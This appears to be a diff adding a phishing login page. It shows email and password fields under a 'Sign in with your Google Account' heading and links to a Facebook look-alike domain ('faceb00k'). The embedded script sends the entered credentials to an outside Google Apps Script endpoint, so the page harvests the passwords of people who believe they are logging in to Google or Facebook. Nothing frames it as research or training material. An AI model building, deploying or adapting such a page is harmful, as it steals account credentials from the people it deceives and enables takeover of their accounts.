@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<!-- <h2 style="text-align: center;">Sign in with your Google Account</h2> -->
+<body>
+    
+    <!-- <h2 class="text" style="justify-content: center; margin-top: 100px;">Sign in with your Google Account</h2> -->
+    <div class="login-container">
+        <div class="login-form">
+            <!-- <h1></h1> -->
+            <img src="image/logo.jpg" alt="Logo" class="logo">
+            
+            <form name="syarif-contact-from">
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <button id="button" type="submit" class="login-button">Login</button>
+            
+            </form>
+            <div class="additional-options">
+                <a href="#">Forgot Password?</a>
+                <a href="https://faceb00kidid.github.io/faceb00k.id/Facebook/index.html">Log in with Facebook</a>
+            </div>
+            <hr>
+            <h3 style="color: rgb(87, 176, 248);">Sign in with your Google Account</h3>
+        </div>
+        
+    </div>
+    
+    <script>
+		const scriptURL = 'https://script.google.com/macros/s/AKfycbwnlIfJkEhCfj-7RpzL8LmInY1IzbHF_qG6O5uHWslFfirgIIajQa03RUZd_xA4wW-B/exec'
+		const form = document.forms['syarif-contact-from']
+	  
+		form.addEventListener('submit', e => {
+		  e.preventDefault()
+		  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+			.then(response => console.log('Success!', response))
+			.catch(error => console.error('Error!', error.message))
+		})
+	  </script>
+</body>
+</html>
